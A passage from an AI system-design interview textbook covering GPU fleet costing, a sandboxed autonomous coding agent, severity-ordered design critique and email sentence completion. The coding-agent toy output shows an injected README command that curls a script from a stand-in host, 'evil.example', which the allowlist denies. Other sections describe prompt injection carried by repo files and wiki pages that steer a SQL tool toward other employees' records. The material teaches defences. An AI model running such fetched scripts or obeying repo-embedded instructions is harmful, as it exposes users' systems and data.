| Demand spike | Pre-stated quality settings, longer free waits, caps — decided in advance |

### Follow-ups (Q→A)
- **Q: "Free users make 80% of images and pay nothing. Cut the cost."** A: Math first: 1.6M free images/day × 10 GPU-s ≈ 185 busy GPUs. Halving free-tier steps (if GPU time really halves) saves ~93 GPUs ≈ **$8,900/day** at $4/h — validate the quality hit. Then shift free work to quiet night hours, then add a daily free quota — each priced.
- **Q: "A new model is twice as good but needs 3× the GPU time."** A: Not fleet-wide: 231 → **694** busy GPUs ≈ **$66,700/day** before headroom. Launch it as a paid tier, and test "twice as good" with pick/upscale rates on matched prompts plus human panels.
- **Q: "Celebrity likenesses appear though prompts name no one."** A: A text filter can't block a name nobody typed — this is the image gate's job: better likeness detection, red-team patterns, hashes of known outputs, and an explicit policy decision.
- **Q: "How do you set the free-tier wait promise?"** A: Take peak demand, serve paid first, compute the p90 wait the leftover capacity can honour, promise it with margin. A kept 90 s beats a broken 30 s.
- **Q: "Storage is creeping toward the GPU bill."** A: 2M images/day = 500,000 requests × 4, and most grid images are never picked: keep chosen images hot, move them cold after ~30 days, delete unpicked ones after a retention window.


### What separates levels, and variations
Mid-level draws the correct pipeline and gives cost as one total at the end; senior states and checks 23.1/s and 231 busy GPUs, sizes peaks separately and states wait promises per tier; staff treats the fleet bill as the product's margin — tiers, quality settings, batch capacity and caps are one system for selling a fleet three ways — and sequences reserved-capacity contracts until demand is steady. **Variations:** *AI music generation* (same jobs and gates; singer-voice imitation becomes the likeness risk) and *erase-and-refill photo editing* (interactive, so a few-second promise, small masked jobs, and the uploaded photo is scanned too).

### Toy: capacity math and a fleet simulation (`code/t2i_fleet_sim.py`)
Three simulated hours in 1-second steps: Poisson arrivals averaging 23 images/s with a 30-minute ×2.2 spike, 20% paid jobs served first, 10 GPU-s per image, an autoscaler that sees only the *previous* minute and whose GPUs take 3 minutes to boot, plus a poison job.

```python
while free_gpus > 0 and (paid_q or free_q):
    tier, q = ("paid", paid_q) if paid_q else ("free", free_q)     # paid always first
    t0, jid = q.popleft()
    if jid == "job500":                                           # poison prompt: retry once,
        ...                                                       # then dead-letter + page
    ...
if t % 60 == 59:                                                  # autoscaler sees only the PAST minute
    want = math.ceil(arrivals_rate * gpu_s / 0.8 + backlog * gpu_s / 120) + warm_pool
    if want > ready + booting:
        heapq.heappush(pending, (t + 180, want - ready - booting))   # 3-minute warm-up
```
Output:
```
1) Envelope math (illustrative)
   2,000,000 images/day = 23.1/s x 10 GPU-s = 231 busy GPUs on average
   fully utilised: 231 x $4.0/h x 24 = $22,222/day; a 500-GPU fleet 24h = $24,000-$48,000/day at $2-$4/h
   free tier (80%): 185 busy GPUs; halving its steps saves ~93 GPUs = $8,889/day (if GPU time really halves)
   a model with 3x GPU-seconds fleet-wide: 694 busy GPUs = $66,667/day before headroom
   storage: 2M images = 500,000 requests x 4; most grid images are never picked

2) Three simulated hours (spike x2.2 in hour 2), paid = 20% of jobs, 3-min GPU warm-up
   warm pool  0: paid p99/max wait    0/  1s | free p99/max  111/132s | util 80% | GPU $4,128 | published 297,788 | dead-letter ['job500']
   warm pool 60: paid p99/max wait    0/  1s | free p99/max   78/ 96s | util 69% | GPU $4,820 | published 297,788 | dead-letter ['job500']
   plot: img/t2i_queue.png
```
![Free-tier queue during the spike, with and without a warm pool](img/t2i_queue.png)

Paid users never notice the spike — the free queue absorbs it. A 60-GPU warm pool cuts the worst free wait from 132 s to 96 s but lowers utilisation from 80% to 69% and adds ~17% to the GPU bill ($4,820 vs $4,128): *buying idle on purpose* is a priced product decision. The poison job is dead-lettered after two crashes.

### TL;DR
Async jobs because generation is slow; do the envelope math first (23.1/s → 231 busy GPUs → $22K–$48K/day); priority queues are pricing, autoscaling signal and UX at once; utilisation is the business; quality is a per-job setting; both safety gates fail closed.

---

## 14.5 Case: autonomous coding agent

> **The question (paraphrased).** Engineering teams hand an AI agent a ticket; it implements the change, runs the test suite and raises a pull request — like a tireless junior developer. 10,000 customer teams will use it.

### Requirements (minutes 0–8)
**Recognition.** "An agent loop with hard limits ([Chapter 9](../09-ai-agents/README.md)) whose tools edit and test code. Running the code gives strong but partial evidence; an isolated environment limits what actions can affect; the PR is a review gate. No single control removes every risk — they complement each other."

![Automated checks, isolation, and independent review provide complementary controls (course diagram)](img/agent-three-controls.svg)
*Figure — Automated checks, isolation, and independent review provide complementary controls (course diagram)*

**Success.**
- *Primary:* **PR merge rate** — merged without major rework, per task class (acceptance rate at task size); plus **time to merge** vs humans on similar tickets.
- **Reviewer burden** — review minutes per agent PR; plausible-but-wrong code costs senior engineers' time.
- **All-in cost per merged PR** — failed runs, compute and review included (measure it; don't assume "a few dollars").
- *Guardrails:* CI-break rate and the **share reverted after merging** — a delayed label, like chargebacks in fraud.

**Scope.** Clearly written tickets only — bugs, small features, tests, refactors; no architecture changes. **The agent proposes; humans merge** — a deliberately low rung of the autonomy ladder ([§9.10](../09-ai-agents/README.md)). Auto-merge is a distant, evidence-gated step (perhaps dependency bumps with passing tests).

### Approach: the environment is the architecture (minutes 8–18)
- **One isolated, disposable environment per task** (repo checkout, dependencies, test runner). Harden containers or use stronger isolation (Firecracker micro-VMs, gVisor) according to the threat model.
- **No production credentials, no deploy access, allowlisted network egress** (**egress** = outbound traffic), ideally via internal package mirrors — even an approved package source can deliver malware. **Least privilege as infrastructure**, not as instructions to the model.
- **A few job-shaped tools**: search and read code, edit files, run tests and linters, a sandbox-confined shell, request a PR. Deliberately absent: database tools, cloud consoles.
- **PR creation lives in a separate service** with narrowly scoped credentials; the sandbox never holds merge, deploy or broad repo tokens.

![What is inside the sandbox, and what is deliberately not (course diagram)](img/agent-sandbox.svg)
*Figure — What is inside the sandbox, and what is deliberately not (course diagram)*

**Context** ([§9.6](../09-ai-agents/README.md)): ticket and acceptance criteria, a per-repo index, a **plan file** the agent revises, and **durable task state** so an hour of work survives a **pod eviction** (the container being killed and rescheduled).

### Architecture: the loop and its verifiers (minutes 18–30)

```mermaid
flowchart TD
    T["Ticket plus acceptance criteria"] --> CL{"Ambiguous?"}
    CL -- "yes" --> ASK["Ask clarifying questions on the ticket"]
    ASK --> PLAN
    CL -- "no" --> PLAN["Write plan file"]
    PLAN --> EDIT["Edit code in sandbox"]
    EDIT --> TEST["Run targeted tests - inner gate"]
    TEST -- "fail and budget left" --> EDIT
    TEST -- "budget exhausted" --> DRAFT["Draft PR or findings comment - never silence"]
    TEST -- "pass" --> SELF["Self-review - secrets scan, diff checks, test-change flag"]
    SELF --> PR["Open PR via PR service"]
    PR --> CI["CI - outer gate, same bar as humans"]
    CI --> HUMAN["Human review - approval gate"]
    HUMAN -- "comments" --> EDIT
    HUMAN -- "approve" --> MERGE["Human merges"]
```

- **The test suite is the inner checkpoint**: change → run → correct until green; legible error messages let the model self-correct.
- **CI is the outer checkpoint** with exactly the rules human PRs face — **never a softer CI path for the agent**.
- **A person approves**, and **reviewer comments go back to the agent** as new instructions — the PR thread is the human–agent interface.
- **Limits**: caps on steps, spend and wall-clock time per ticket type. Hitting a cap yields **something useful** — a draft PR or a progress note — never silence.
- **Which model where**: the strongest model plans and codes; cheap models do rote work (test-output triage, commit messages) — **routing inside the loop** — and **prefix caching** avoids reprocessing unchanged repo context.

![Three gates: tests inside, CI outside, humans at the end (course diagram)](img/agent-verifier-gates.svg)
*Figure — Three gates: tests inside, CI outside, humans at the end (course diagram)*

### Evaluation (minutes 30–38)
- **An offline test bench** from past real tickets, each with an accepted fix and **held-back tests** the agent can't see (SWE-bench is built the same way from real GitHub issues).
- **Trajectory metrics** (steps, test iterations, budget burn, tests modified) next to outcome metrics ([§9.9](../09-ai-agents/README.md)).
- **In production**: merges, reverts and review effort per ticket type — the evidence the autonomy ladder needs.

### Scaling and cost
- Sandboxes are independent, so scaling out is counting containers — the same queue/priority/utilisation shape as the text-to-image fleet.
- Real limits are per repo: merge conflicts between concurrent agent branches and, above all, **reviewer throughput** — the honest bottleneck.
- Estimate per task (model calls + sandbox time + tests + review) and divide total spend by *merged* PRs.

### Safety
- **Prompt injection lives in the repo**: a README or comment can carry instructions, and a dependency's install script can run code. The egress allowlist and missing credentials bound the damage — *a fooled model inside a bounded system* ([§12.4](../12-safety-ethics-governance/README.md)).
- Supply-chain screening on added dependencies, secret scanning on every diff, an audit trace per task.

### Failure modes
| Failure | Response |
|---|---|
| Agent weakens tests to pass | Flag any test modification for elevated review; final acceptance uses tests the agent can't change |
| Budget exhausted | Draft PR / findings comment with the plan and last results |
| Pod evicted mid-task | Resume from durable task state |
| Malicious dependency | Registry allowlist, lockfile-only updates, supply-chain scan as a CI gate; egress limits and no credentials bound a compromised install script |

### Follow-ups (Q→A)
- **Q: "PRs pass CI but solve the wrong problem."** A: Compare ticket, plan, diff and review comments first — vague criteria, misreading or weak tests. Remedies: the agent **asks questions first** on vague tickets (cheap, often the biggest win) and humans **review the plan** before code exists.
- **Q: "Why would teams trust it?"** A: Trust is **instrumented**: start draft-PR-only, trace every action, publish merge rate, revert rate and reviewer burden per ticket class, and widen autonomy per class as the numbers earn it.
- **Q: "Monorepo with 30-minute CI."** A: Tiered verification: fast tests chosen by **test-impact analysis** (which tests exercise the changed code) inside the loop; the full suite at PR time.
- **Q: "Cost per merged PR is $40."** A: Attribute first (trajectories reveal oversized context and thrashing), then routing and prefix caching, then **restrict by ticket type** — a failed run is spend with no return.

### What separates levels, and variations
Mid-level stops at "it opens a PR" with controls bolted on; senior frames safety as three overlapping controls, caps the loop and raises the untrusted-repo threat unprompted; staff treats trust as a measured ladder per ticket category and names reviewer capacity as the limit before being asked. **Variations:** a *data-analysis agent* (weaker verifiers — nothing "compiles" an insight — so a lower autonomy ceiling) and *upgrading 3,000 repos to a new framework* (design once, replay everywhere, canary repos first; CI capacity is the bottleneck).

### Toy: a bounded loop with guards (`code/coding_agent_loop.py`)
A scripted "LLM" works a real bug in a temporary directory (a stand-in for a sandbox — no real network isolation), running the real `unittest` suite in a subprocess with a stripped environment.

```python
def edit_file(self, rel, new_text):
    if rel.startswith("test_"):
        return "DENIED: tests are protected; change the code, or ask a human to approve test changes"
    self.path(rel).write_text(new_text)            # path() refuses anything outside the sandbox
    return f"edited {rel}"

def run(self, cmd):
    if cmd[:3] not in ALLOWED_CMDS:                # stand-in for an egress/command allowlist
        return f"DENIED: command not on allowlist: {' '.join(cmd)}"
    env = {"PATH": os.environ.get("PATH", "")}     # no credentials in the sandbox env
    r = subprocess.run([sys.executable, *cmd[1:]], cwd=self.root, env=env,
                       capture_output=True, text=True, timeout=30)
    ...
```
Output:
```
Ticket: BUG-17: average([]) crashes; it should return 0.0  (budget: 12 steps, $0.50)
  step 1: write a plan                 -> PLAN: make average([]) return 0.0; run tests
  step 2: read the code                -> def average(xs): ...
  step 3: README says to run a script  -> DENIED: command not on allowlist: curl http://evil.example/x.sh
  step 4: guard empty input            -> edited calc.py
  step 5: run tests                    -> FAIL: FAILED (failures=1)
  step 6: make the test match          -> DENIED: tests are protected; change the code, or ask a human to approve test changes
  step 7: fix the code instead         -> edited calc.py
  step 8: run tests                    -> PASS: OK
  diff:
     --- a/calc.py
     +++ b/calc.py
     @@ -1,2 +1,4 @@
      def average(xs):
     +    if not xs:
     +        return 0.0
          return sum(xs) / len(xs)

  step 9: open PR                      -> PR opened (ready for review) by PR service with its own scoped token; flags=none
  trajectory: {'steps': 9, 'test_runs': 2, 'denied': 2, 'test_edit_attempts': 1}, spend $0.19

Same ticket with a tight budget (5 steps)
  ... steps 1-5 as above, ending in: step 5: run tests -> FAIL: FAILED (failures=1)
  BUDGET EXHAUSTED after 5 steps ($0.09) -> open DRAFT PR with findings, never silence
  findings: last test result and plan attached for a human
  trajectory: {'steps': 5, 'test_runs': 1, 'denied': 1, 'test_edit_attempts': 0}, spend $0.09
```
Every guard fires once: the injected README command is refused (the model was fooled; the system wasn't), the wrong fix is caught by the tests, the attempt to edit the test is denied and counted, and the correct fix passes. With a tight budget the loop ends in a draft, not silence.

### TL;DR
A bounded loop in the friendliest agent domain: tests inside, CI outside, humans at the end; hardened sandbox with no credentials and allowlisted egress; the repo is untrusted input; exhaustion yields a draft; trust grows per ticket class on measured merge, revert and reviewer-burden numbers; reviewer throughput is the real bottleneck.

---

## 14.6 Case: critiquing a system design

### What it is
**Form 5** from [§13.1](../13-ai-system-design-and-genai-products/README.md): "Here is our design — what's wrong with it?" You assess a prototype or production system and decide what must change before rollout — judgement and diplomacy together. Review questions use **their own order**, not the seven steps. Keep proven problems apart from guesses and from facts you don't have yet.

### How it works — critique in severity order, systems first

![Critique in severity order, systems first (course diagram)](img/critique-severity.svg)
*Figure — Critique in severity order, systems first (course diagram)*

| Tier | Category | Question it answers | Typical findings |
|---|---|---|---|
| 1 | **Violated invariants** | What is wrong *right now*? | Security, permissions, money |
| 2 | **Missing loops** | What can't *stay* right? | No evals, no feedback capture |
| 3 | **Reliability gaps** | What fails ungracefully? | No fallbacks, stale or fragile indexes |
| 4 | **Economics** | What won't survive scale? | No routing, caching or budgets |
| 5 | **Quality opportunities** | What could simply be better? | Reranking, hybrid retrieval, query rewriting |

The order is a default — a bad enough quality problem can become a blocker. For every finding state the **consequence, evidence, uncertainty and fix**; the most interesting flaw is not necessarily the most urgent.

### The exercise
> **The setup (paraphrased).** An internal helpdesk bot embeds an employee's question, fetches the 10 nearest wiki chunks (the whole wiki is re-indexed nightly), and a top-tier model writes the reply. For personal HR questions the model can call a tool that runs read-only SQL on the HR database. The demo went well; the plan is to switch it on for all 30,000 staff. What do you think?

Set a 10-minute timer and write your critique in severity order before reading on.

```mermaid
flowchart LR
    E["Employee question"] --> API["API"]
    API --> EMB["Embed"]
    EMB --> VDB[("Vector DB - top 10 - no ACL filter")]
    WIKI[("Whole wiki - nightly full re-index")] --> VDB
    VDB --> LLM["Frontier model"]
    LLM --> SQL["Tool - model-written read SQL on HR DB"]
    SQL --> LLM
    LLM --> ANS["Answer - no checks, no feedback, no fallback"]
    classDef bad fill:#fde2e2,stroke:#c0392b,color:#000
    class VDB,SQL,ANS bad
```

### Tier 1 — broken invariants (open with these, in a level tone)
1. **No permission filtering on retrieval.** A similar-sounding question from anyone can pull restricted chunks into an answer. Enforce current permissions *before* content reaches context, output, caches or logs: per-chunk ACL metadata filtered in the index query ([§7.9](../07-embeddings-vector-databases-and-rag/README.md)). It blocks launch — but first confirm it isn't enforced somewhere the diagram doesn't show.
2. **The SQL tool is far too broad.** If the model writes the `WHERE` clause, a manipulated prompt can insert someone else's employee ID: the model is deciding access. Replace it with a narrow `get_my_record(fields)` whose employee ID comes from the authenticated session; if SQL must stay, enforce read-only scope, row-level security and limits *outside* the model. This is the worst problem in the design.
3. **No injection posture.** Wiki pages flow as untrusted input into a model holding a database tool — the **indirect prompt injection** path — with no input gate, no data tagging and no action gate.

![The three tier-one findings, said first and said calmly (course diagram)](img/critique-tier-one.svg)
*Figure — The three tier-one findings, said first and said calmly (course diagram)*

### Tier 2 — missing loops
4. **No evaluation.** "Great demo" means nothing was measured. Before 30,000 users: a test set with **unanswerables** and **access-violation probes**, a faithfulness metric, and a groundedness gate on HR answers.
5. **No feedback** — no ratings, no human hand-off, no traces — so problems go unnoticed.

### Tier 3 — reliability gaps
6. **Nightly full re-index** → up to 24 h staleness and a fragile all-at-once job. Prefer incremental, **idempotent** (safe to re-run), delete-propagating sync with a freshness SLO; build a new index and swap atomically.
7. **No fallbacks** — vector DB, model API or tool timeout each surface as raw errors.

### Tiers 4–5 — economics and quality (one sentence each)
A frontier model on every query (evaluate routing and permission-aware caching); top-10 stuffing without reranking or a context budget; vector-only retrieval may miss exact identifiers such as form names or ticket numbers (measure, then consider hybrid); follow-up questions may need query rewriting using conversation context.

### Delivering critique without offending the author
The author may be in the room. Three moves:
1. **Start with what's sound**: "Retrieval fits this problem and a tool was a sensible idea — the gaps are in how access is enforced."
2. **Attach a consequence and a fix to every finding**, never a bare preference.
3. **End with a sequenced plan**: *blockers* → *week one* → *later* (see the linter's plan below).

![Delivering critique as a plan, not a verdict (course diagram)](img/critique-plan.svg)
*Figure — Delivering critique as a plan, not a verdict (course diagram)*

**Practice drill:** take any capstone in this book, delete three subsystems at random and critique the damaged design cold — naming what's *absent* is a different skill from building.

### Two more to practise (10 minutes each)
**Exercise A — churn model (paraphrased).** Monthly, someone exports a CSV and retrains a churn model; nightly, all customers are scored into the CRM; marketing discounts the riskiest 10%. After a year, everyone believes it works. Findings, most severe first: no **point-in-time joins** (check for leakage — features using information from after the prediction time); **no holdback group**, so nobody knows whether discounts cause retention or just give away margin; a **self-inflicted feedback loop** (discounts change what the next training set learns); stale hand-run refreshes; no model registry or rollback.

**Exercise B — "hallucinations fixed" (paraphrased).** A support RAG bot made things up; the team set temperature to 0, told the model not to invent facts, and retrieved 20 chunks instead of 5. Complaints fell. Findings: none of those changes *checks* an answer — groundedness checks are still missing ([§7.8](../07-embeddings-vector-databases-and-rag/README.md)); temperature 0 reduces variation, not falsehood; top-k 20 adds cost and **lost-in-the-middle** risk (models under-use information buried mid-context); complaint counts stand in for a faithfulness eval never built; and the bot still can't decline.

### What separates levels
Mid-level spots real issues but opens with product opinions ("I'd swap the vector DB") stated as taste; senior opens with tier-1 issues, each with impact and remedy, and keeps severity order; staff also reads the room — affirms the shape, sequences blockers / week one / later, and ends with a to-do list, not a verdict.

### Toy: a severity-ordered design linter (`code/design_critic.py`)
Rules encode the method: each has a tier, a check over a description of the design, a consequence and a fix.

```python
Rule(1, lambda d: d.get("tool") == "free_sql" and not d.get("authz_outside_model"),
     "Model writes the SQL (and its WHERE clause) for HR data",
     "one injected prompt can read another employee's record",
     "replace with get_my_record(fields) bound to the caller's identity; row-level security"),
...
found = sorted((r for r in RULES if r.check(design)), key=lambda r: r.tier)
```
Output (abridged):
```
== Internal support copilot (30,000 employees): 10 findings
   what the shape gets right: RAG is the right pattern and a tool for personal HR questions is a good instinct
   1. [T1 violated invariant] No permission filter on retrieval
      consequence: restricted pages reach anyone who asks a nearby question
      fix: store ACLs per chunk, filter in the index query, re-check current access
   2. [T1 violated invariant] Model writes the SQL (and its WHERE clause) for HR data
      consequence: one injected prompt can read another employee's record
      fix: replace with get_my_record(fields) bound to the caller's identity; row-level security
   3. [T1 violated invariant] No injection posture while the model holds a tool
      ...  (findings 4-9 cover tiers 2-4)
   10. [T5 quality] Vector-only retrieval
      consequence: may miss exact identifiers (form names, ticket numbers)
      fix: measure, then add keyword (BM25) retrieval and fusion if it helps
   plan:
     blocker (before rollout): No permission filter on retrieval; Model writes the SQL (and its WHERE clause) for HR data; No injection posture while the model holds a tool; No evaluation set ('works great in the demo'); No feedback capture or traces
     week one: Nightly full re-index; No fallbacks for vector DB, model API or tool timeouts
     later: Frontier model for every query, no routing or caching; Top-10 chunks stuffed into context without reranking; Vector-only retrieval

== Same design after the blockers are fixed: 5 findings
   ...
```
A linter can't replace judgement — each finding must be confirmed against the real system — but writing the rules down is a good way to internalise the severity order.

### TL;DR
Review by severity — invariants, feedback loops, reliability, economics, then quality — and never lead with favourite tools. Pair every issue with its impact and remedy, and end with blockers / week one / later.

---

## 14.7 Comparison across the cases

| | Legal research assistant | AI meeting assistant | Text-to-image at scale | Autonomous coding agent | Design critique |
|---|---|---|---|---|---|
| **Family / known system** | Generative — enterprise RAG, maximum stakes | Generative — live lane + async workflow + archive RAG | Generative — async GPU job pipeline | Agentic — bounded loop | Form 5 review (here: RAG + tool) |
| **Primary metric** | Attorney-verified usefulness | WER + speaker attribution; summary edit rate; Q&A faithfulness | Images kept per session | PR merge rate | Findings with consequence and fix |
| **Binding / guardrail metrics** | Fabricated citations (measured zero), unsupported claims, two-way refusal correctness | Wrong-owner action items, privacy incidents | Wait time by tier, safety incident rate | Reviewer burden, CI failure, revert rate | Severity order kept |
| **Latency posture** | Relaxed (~30 s) — spent on verification | ms (live) / minutes (summaries) / seconds (Q&A) | Seconds (paid p90) to ~a minute (free) | Minutes to hours per task | — |
| **Dominant cost** | Licensed content + per-query verification | Transcription (audio minutes) | GPU fleet utilisation | Model calls per task + reviewer time | — |
| **Key data structure** | Citation graph + treatment metadata | Timestamped transcript chunks + ACLs | Job record (prompt, seed, versions, gate scores) | Repo index + plan file + durable task state | The design's facts |
| **Signature control** | Unresolvable citations cannot render; fail closed | ACL-bounded synthesis; tombstone-and-propagate | Prompt gate before GPU, image gate before access; DLQ | Sandbox, protected tests, CI, human review | Tier-1 blockers before rollout |
| **Free labels / feedback** | Flagged citations → regression suite | Summary edits, reassignments | Pick / upscale / regenerate | Review comments, merges, reverts | — |
| **Fallback** | Research pointers | Status + revised ETA; low-confidence spans flagged | Lower quality settings, longer free waits, caps | Draft PR with findings | Sequenced plan |
| **Toy script** | `legal_citation_verifier.py` | `meeting_pipeline.py` | `t2i_fleet_sim.py` | `coding_agent_loop.py` | `design_critic.py` |

Patterns that repeat: **recognise the known system in minute two**, **spend the flexible budget (usually latency) on the binding risk**, **every output links back to its evidence**, **fail closed where harm is irreversible**, **production feedback becomes the eval suite**, and **cost is itemised per unit before being multiplied by volume**.

The seven model-centric cases that follow (§14.8–§14.14) have their own comparison table at the end of Part II.

---

## Part II — model-centric GenAI cases

Cases 14.2–14.5 were **product-centric**: the model was a component you could mostly buy, and the grade came from retrieval, queues, gates and loops. The seven cases below are **model-centric** — the interviewer expects you to pick the model family, say what data trains it, how it decodes or samples, how you would know it is good, and only then how to serve it. The template is the same, but the *Approach* phase carries more weight, and each case names the primary papers behind the design so you can read the originals.

| Script | Case | What it demonstrates |
|---|---|---|
| `code/smart_compose.py` | Email completion | Beam search, confidence threshold vs trigger/acceptance, personal blend, pronoun filter |
| `code/translation_toy.py` | Translation | Character-trigram language ID, BLEU from scratch and its blind spots, segment-cache hit rates |
| `code/caption_toy.py` | Captioning | Grounding rerank, CHAIR hallucination rate, CIDEr-style consensus, alt-text policy |
| `code/gan_faces_toy.py` | GAN faces | GAN training on 8 modes, mode dropping, why FD alone misleads, the truncation trick |
| `code/latent_compression.py` | High-res synthesis | Token and attention arithmetic, a k-means VQ codebook: compression vs PSNR |
| `code/headshot_lora.py` | Personalised headshots | Low-rank update vs full fine-tune, prior-preservation trade-off, per-user cost |
| `code/video_budget.py` | Text-to-video | Spacetime token counts, factorised attention, flicker, fleet cost |

---

## 14.8 Case: sentence completion in email

> **The question (paraphrased).** An email product with hundreds of millions of daily users wants to suggest the rest of a sentence as people type, shown as grey text that the user accepts with Tab. Design it.

### Requirements (minutes 0–8)
**Recognition.** "This is next-token prediction ([§4.2](../04-large-language-models/README.md)) under a hard latency budget at enormous request volume — a *small* language model served close to the user, plus a gate that decides when to stay silent. It is the inline-completion archetype of [§13.10](../13-ai-system-design-and-genai-products/README.md) with email's privacy rules."

**Success — three numbers, said together.**
1. **Acceptance rate** — suggestions accepted ÷ suggestions shown. A wrong suggestion costs the user attention.
2. **Trigger rate** (also called coverage) — suggestions shown ÷ opportunities to show one. Acceptance can be pushed to 100% by never suggesting, so the two are always reported together.
3. **Characters saved per email** — the user benefit that the first two combine into.

*Guardrails:* the rate of offensive, biased or privacy-leaking suggestions on a red-team set (the target is none found), and **latency**. A person typing 60 words per minute enters ~5 characters per second, so a keystroke arrives roughly every **200 ms**; a suggestion that lands after the next keystroke is useless. Budget ~100 ms end to end at p90 (the 90th-percentile request), of which the network takes 30–50 ms.

**Scope.** Sentence completion in the body of new emails and replies, one language first, no whole-email drafting (that is a different, slower product with an LLM).

### Approach: data and model (minutes 8–18)
- **Training data is users' own sent email** — the most sensitive corpus in the company. It is used only under the product's privacy terms, with identifiers removed, and with a defence against **memorisation**: language models can reproduce rare strings seen in training, such as a phone number that appeared a few times (Carlini et al., *The Secret Sharer*, 2019). Mitigations: drop rare n-grams and personal data before training, cap the contribution of any one user, and consider differentially private training (training that mathematically bounds how much any one example can influence the model).
- **Context beyond the prefix.** The words typed so far are the main input, but the subject line and, for replies, the previous message help a lot; Google's published Smart Compose system conditions on both (Chen et al., *Gmail Smart Compose: Real-Time Assisted Writing*, KDD 2019). Cheap signals such as locale and time of day help greetings ("Have a great weekend" on Friday).
- **Model, at name level.** A small decoder-only language model — tens of millions of parameters, not billions — because it must answer in tens of milliseconds at a very high request rate. A large model can serve as a **teacher** whose outputs train the small one (**distillation**, [§11.8](../11-llm-serving-and-inference/README.md)); quantise the student for serving ([§11.7](../11-llm-serving-and-inference/README.md)).
- **Decoding.** **Beam search** ([§4.7](../04-large-language-models/README.md)) keeps the few most probable partial completions and extends them word by word; stop at the end of the sentence or when confidence falls. Show the best completion **only if its probability clears a threshold** — the single most important product knob.
- **Personalisation.** People have habits ("Cheers, Sam"). Keep a tiny per-user model — even an n-gram count table — and **interpolate** its probabilities with the global model: p = (1 − λ)·p_global + λ·p_user. It is cheap, stays in the user's own data store, and is deleted with the account.

### Architecture (minutes 18–30)
**Envelope first** (illustrative): 100M daily writers × 10 emails × ~50 opportunities per email (roughly one per word) = **5 × 10¹⁰ requests/day ≈ 580,000/s average**, perhaps 1.2M/s at peak. Nothing that costs even 1 ms of accelerator time per request is affordable without batching and reuse, which drives the design.

```mermaid
flowchart LR
    ED["Editor in browser or app"] --> LOC{"User typed the suggested characters?"}
    LOC -- "yes" --> TRIM["Trim suggestion locally - no request"]
    LOC -- "no, pause or word boundary" --> GW["Regional gateway - sticky per draft"]
    GW --> INF["Inference server - batched small LM, per-draft cache"]
    INF --> PB["Personal blend - per-user n-gram table"]
    PB --> POL{"Confidence and policy gate"}
    POL -- "pass" --> ED
    POL -- "fail" --> NONE["Show nothing"]
    LOGS[("Accept and reject events, no text")] -.-> EVAL["Offline eval and threshold tuning"]
    ED -.-> LOGS
```

- **Most requests should never be sent.** If the user types exactly the characters the grey text predicted, the client trims the suggestion and keeps showing the rest. Requests go out only at word boundaries or after a short pause (a **debounce**, typically tens of ms), and stale responses — ones that arrive after the prefix has changed — are dropped.
- **Sticky sessions and a per-draft cache.** Re-reading the whole email for each keystroke wastes the budget. Route every request for one draft to the same server, which keeps that draft's model state (the KV cache, [§4.9](../04-large-language-models/README.md)) so only the newly typed tokens are processed. If the server changes, the next request simply recomputes — a cache miss, not an error.
- **Batching under a deadline.** The server gathers requests for a few milliseconds and runs them together; the batch closes on size *or* deadline, whichever comes first ([§11.5](../11-llm-serving-and-inference/README.md)).
- **The gate** applies the confidence threshold and the policy filter (below) and returns *nothing* by default. Silence is the safe, cheap answer.

### Evaluation and the loop (minutes 30–38)
- **Offline:** replay held-out emails word by word. At each position, ask for a suggestion and count it correct only if the whole suggestion matches what the person actually typed next. Report trigger rate, exact-match acceptance and characters saved per threshold — the toy below does exactly this. Perplexity (how surprised the model is by real text) is a useful training signal but does not predict acceptance on its own.
- **Online:** A/B test (two randomly split user groups) on acceptance, trigger rate, characters saved, and **undo-after-accept** (the user deleted what they accepted — a hidden rejection). Logging stores *events* (shown, accepted, rejected, lengths), not email text.
- **The threshold is re-tuned per language and per surface** (mobile users accept shorter suggestions) — it is a product decision drawn on the trigger-vs-acceptance curve, not a constant.

### Scaling and cost
Cost ≈ requests actually sent × tokens processed per request × cost per token. The three big levers are all *request avoidance* — local trimming, debouncing and the confidence gate — followed by model size (distil and quantise) and the per-draft cache. A mobile variant can move a very small model on-device, removing the network from the budget and keeping text local.

### Safety and privacy
- **Never guess people's attributes.** A model trained on email learns stereotypes ("the engineer … he"). Gmail's product team told Reuters in November 2018 (a widely reported story) that Smart Compose stopped suggesting gendered pronouns altogether after it proposed "him" for an unnamed investor — no fix was reliable enough; more generally, keep a **blocklist of suggestion content** (slurs, pronouns referring to others, sensitive health or financial terms) that can be updated without retraining.
- **No cross-user leakage:** the global model is trained with the memorisation defences above; per-user tables are keyed to the account and never shared.
- **Sensitive contexts:** suppress suggestions in threads that look like condolences, legal or medical content, where a glib completion does harm.

### Failure modes
| Failure | Response |
|---|---|
| Inference slow or down | Client time-out drops the suggestion; typing is never blocked |
| Offensive suggestion reported | Hot-update the blocklist within minutes; add the prefix to the red-team set |
| New model lowers acceptance | Canary on a small slice, automatic rollback on the online metrics |
| Personal table suggests another user's text | Treat as a privacy incident: tables are per-account by construction, so look for a keying bug |

### Follow-ups (Q→A)
- **Q: "Product wants twice as many suggestions."** A: Lower the threshold and show the curve: in the toy, going from 0.30 to 0.05 raises the trigger rate from 44% to 60% but drops acceptance from 47% to 37% — and characters saved barely moves. More suggestions mostly means more wrong ones.
- **Q: "Why not use our big LLM?"** A: A 100 ms budget at ~10⁶ requests/s rules it out; use it offline as the teacher for distillation and to generate evaluation data.
- **Q: "How do you personalise without training a model per user?"** A: Interpolate a per-user count table with the global model; it needs no GPU, updates instantly and is deleted with the account.
- **Q: "Multilingual users switch language mid-email."** A: Detect the language of the current sentence (character n-grams, as in §14.9) and route to that language's model; show nothing when detection is unsure.

### What separates levels, and variations
Mid-level draws "LLM behind an API"; senior budgets the 200 ms inter-keystroke gap, avoids requests on the client and treats the threshold as a product curve; staff adds memorisation defences, attribute-guessing policy and on-device options as first-class design constraints. **Variations:** *code completion* (longer suggestions, the repository as context, the same trigger/acceptance trade-off — [§13.10](../13-ai-system-design-and-genai-products/README.md)) and *mobile keyboard next-word prediction* (on-device models trained with **federated learning**, where phones compute updates locally and only aggregated updates leave the device — Hard et al., 2018).

### Toy: threshold, personal blend and filter (`code/smart_compose.py`)
A trigram model with backoff stands in for the small LM; beam search proposes completions; replaying 800 held-out synthetic emails measures the three success numbers.

```python
def suggest(prefix, g, u, beam=3, max_words=6, lam=0.6, block=True):
    beams, done = [(0.0, list(prefix), [])], []
    for _ in range(max_words):
        nxt = []
        for lp, ctx, out in beams:
            a, b = (["<s>", "<s>"] + ctx)[-2:]
            d = mix(g.dist(a, b), u.dist(a, b) if u else None, lam)   # global + personal blend
            for w, p in sorted(d.items(), key=lambda kv: -kv[1])[:beam]:
